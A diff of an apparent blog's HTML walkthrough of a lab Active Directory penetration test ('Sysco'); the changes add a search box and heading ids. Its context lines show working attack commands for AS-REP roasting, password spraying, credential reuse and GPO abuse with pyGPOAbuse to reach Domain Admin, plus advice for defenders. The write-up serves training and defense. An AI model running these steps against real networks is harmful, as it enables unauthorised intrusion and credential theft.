@@ -140,6 +140,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -197,7 +207,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>Sysco</h2>
+  <h2 id="sysco">Sysco</h2>
 
   <div class="machine-info">
     <ul>
@@ -208,12 +218,12 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>Sysco is a Managed Service Provider that has tasked us with performing an external penetration test on their Active Directory domain. The objective is to obtain an initial foothold, move laterally, and escalate privileges while evading Antivirus detection to achieve Domain Administrator privileges.</p>
 
-  <h2>Enumeration</h2>
+  <h2 id="enumeration">Enumeration</h2>
 
-  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <h3 id="nmap-scan"><span class="step">[Step 1]</span> Nmap Scan</h3>
   <p>I started with a comprehensive port scan to identify all open services:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.0.30.129 -oN nmap_scan</code></pre>
 
@@ -246,7 +256,7 @@
     <li>RDP is available on port 3389</li>
   </ul>
 
-  <h3><span class="step">[Step 2]</span> Web Enumeration</h3>
+  <h3 id="web-enumeration"><span class="step">[Step 2]</span> Web Enumeration</h3>
   <p>Browsing to <code>http://sysco.local/#team</code>, I found a team page with employee names:</p>
 
   <p><img src="../assets/sysco/team-page-employees.png" alt="Team page showing employee names on the Sysco MSP website" loading="lazy"></p>
@@ -264,7 +274,7 @@ Lainey Moore</code></pre>
 
   <p><img src="../assets/sysco/roundcube-webmail-login.png" alt="Roundcube webmail login page" loading="lazy"></p>
 
-  <h3><span class="step">[Step 3]</span> Username Enumeration</h3>
+  <h3 id="username-enumeration"><span class="step">[Step 3]</span> Username Enumeration</h3>
   <p>Using the employee names, I generated potential username formats with username-anarchy:</p>
   <pre><code>$ ./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > users.list</code></pre>
 
@@ -294,7 +304,7 @@ Lainey Moore</code></pre>
     <li><code>jack.dowland</code></li>
   </ul>
 
-  <h2>Initial Access - AS-REP Roasting</h2>
+  <h2 id="initial-access-as-rep-roasting">Initial Access - AS-REP Roasting</h2>
 
   <div class="question">
     <strong>What is AS-REP Roasting?</strong>
@@ -303,7 +313,7 @@ Lainey Moore</code></pre>
     AS-REP Roasting targets Active Directory accounts that have Kerberos pre-authentication disabled. When this setting is enabled, anyone can request an Authentication Server Response (AS-REP) for that user, which contains encrypted data that can be cracked offline to recover the plaintext password.
   </div>
 
-  <h3><span class="step">[Step 4]</span> AS-REP Roasting Attack</h3>
+  <h3 id="as-rep-roasting-attack"><span class="step">[Step 4]</span> AS-REP Roasting Attack</h3>
   <p>I attempted AS-REP Roasting against the valid users:</p>
   <pre><code>$ nxc ldap 10.0.30.129 -u valid_users.txt -p '' --asreproast asreproasting_hash</code></pre>
 
@@ -323,9 +333,9 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <p><img src="../assets/sysco/netexec-credential-validation.png" alt="NetExec validating the cracked credentials" loading="lazy"></p>
 
-  <h2>Lateral Movement</h2>
+  <h2 id="lateral-movement">Lateral Movement</h2>
 
-  <h3><span class="step">[Step 5]</span> BloodHound Collection</h3>
+  <h3 id="bloodhound-collection"><span class="step">[Step 5]</span> BloodHound Collection</h3>
   <p>I collected Active Directory data for analysis:</p>
   <pre><code>$ bloodhound-python -u jack.dowland -p '[REDACTED]' -d SYSCO.LOCAL -ns 10.0.30.129 -c all</code></pre>
 
@@ -340,7 +350,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <p>BloodHound did not reveal any direct privilege escalation paths for <code>jack.dowland</code>, and the user had no access to interesting file shares.</p>
 
-  <h3><span class="step">[Step 6]</span> Credential Reuse - Roundcube</h3>
+  <h3 id="credential-reuse-roundcube"><span class="step">[Step 6]</span> Credential Reuse - Roundcube</h3>
   <p>Since Jack is an employee, I tested his credentials against the Roundcube webmail and successfully logged in:</p>
 
   <p><img src="../assets/sysco/roundcube-login-success.png" alt="Successful Roundcube webmail login" loading="lazy"></p>
@@ -349,7 +359,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <p><img src="../assets/sysco/email-cfg-attachment.png" alt="Email with Cisco configuration file attachment" loading="lazy"></p>
 
-  <h3><span class="step">[Step 7]</span> Cracking the Cisco Secret</h3>
+  <h3 id="cracking-the-cisco-secret"><span class="step">[Step 7]</span> Cracking the Cisco Secret</h3>
   <p>The configuration file contained an enable secret:</p>
   <pre><code>enable secret 5 $1$mERr$isugnYiHsjHT.i.tc2GDY.</code></pre>
 
@@ -369,7 +379,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <pre><code>$1$mERr$isugnYiHsjHT.i.tc2GDY.:[REDACTED]</code></pre>
 
-  <h3><span class="step">[Step 8]</span> Password Spraying</h3>
+  <h3 id="password-spraying"><span class="step">[Step 8]</span> Password Spraying</h3>
 
   <div class="question">
     <strong>What is Password Spraying?</strong>
@@ -387,12 +397,12 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
     <strong>Credentials obtained:</strong> lainey.moore:[REDACTED]
   </div>
 
-  <h3><span class="step">[Step 9]</span> Enumerating Lainey's Access</h3>
+  <h3 id="enumerating-lainey-s-access"><span class="step">[Step 9]</span> Enumerating Lainey's Access</h3>
   <p>BloodHound showed that <code>lainey.moore</code> is a member of both <code>Remote Desktop Users</code> and <code>Remote Management Users</code>:</p>
 
   <p><img src="../assets/sysco/bloodhound-group-memberships.png" alt="BloodHound showing Lainey's group memberships" loading="lazy"></p>
 
-  <h3><span class="step">[Step 10]</span> RDP Session and More Credentials</h3>
+  <h3 id="rdp-session-and-more-credentials"><span class="step">[Step 10]</span> RDP Session and More Credentials</h3>
   <p>I connected via RDP:</p>
   <pre><code>$ xfreerdp /v:10.0.30.129 /u:lainey.moore /p:'[REDACTED]'</code></pre>
 
@@ -420,9 +430,9 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
     <strong>Credentials obtained:</strong> greg.shields:[REDACTED]
   </div>
 
-  <h2>Privilege Escalation - GPO Abuse</h2>
+  <h2 id="privilege-escalation-gpo-abuse">Privilege Escalation - GPO Abuse</h2>
 
-  <h3><span class="step">[Step 11]</span> Identifying the Attack Path</h3>
+  <h3 id="identifying-the-attack-path"><span class="step">[Step 11]</span> Identifying the Attack Path</h3>
   <p>BloodHound revealed that <code>greg.shields</code> has dangerous privileges over the Default Domain Policy GPO:</p>
 
   <p><img src="../assets/sysco/bloodhound-gpo-privileges.png" alt="BloodHound showing greg.shields has GPO edit privileges" loading="lazy"></p>
@@ -434,7 +444,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
     Group Policy Objects (GPOs) control settings across Active Directory. If a user can modify a GPO that applies to privileged systems (like the Domain Controller), they can add malicious scheduled tasks or scripts that execute with SYSTEM privileges, effectively granting them administrative access.
   </div>
 
-  <h3><span class="step">[Step 12]</span> Exploiting the GPO</h3>
+  <h3 id="exploiting-the-gpo"><span class="step">[Step 12]</span> Exploiting the GPO</h3>
   <p>I used pyGPOAbuse to create a scheduled task that adds <code>greg.shields</code> to the local Administrators group:</p>
   <pre><code>$ python3 pygpoabuse.py 'SYSCO.LOCAL/greg.shields:[REDACTED]' \
     -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
@@ -454,7 +464,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <p><img src="../assets/sysco/administrator-access-confirmed.png" alt="Evil-WinRM session confirming Administrator access" loading="lazy"></p>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
   <div class="attack-chain">
     <pre><code>Web Enumeration (Team Page)
          |
@@ -482,7 +492,7 @@ Password Spraying --> greg.shields
          v
 GPO Abuse --> Domain Administrator</code></pre>
 
-    <h4>Detailed Steps:</h4>
+    <h4 id="detailed-steps">Detailed Steps:</h4>
     <ol>
       <li><strong>Web Enumeration</strong> - Discovered employee names on the company website</li>
       <li><strong>Username Enumeration</strong> - Generated and validated usernames via Kerbrute</li>
@@ -496,9 +506,9 @@ GPO Abuse --> Domain Administrator</code></pre>
     </ol>
   </div>
 
-  <h2>Lessons Learned</h2>
+  <h2 id="lessons-learned">Lessons Learned</h2>
 
-  <h3><span class="step defender">For Defenders</span></h3>
+  <h3 id="for-defenders"><span class="step defender">For Defenders</span></h3>
   <div class="answer lessons-learned">
     <ul>
       <li>Audit accounts with Kerberos pre-authentication disabled</li>
@@ -510,7 +520,7 @@ GPO Abuse --> Domain Administrator</code></pre>
     </ul>
   </div>
 
-  <h3><span class="step pentester">For Pentesters</span></h3>
+  <h3 id="for-pentesters"><span class="step pentester">For Pentesters</span></h3>
   <div class="answer lessons-learned">
     <ul>
       <li>Always check webmail and other internal apps for credential reuse</li>
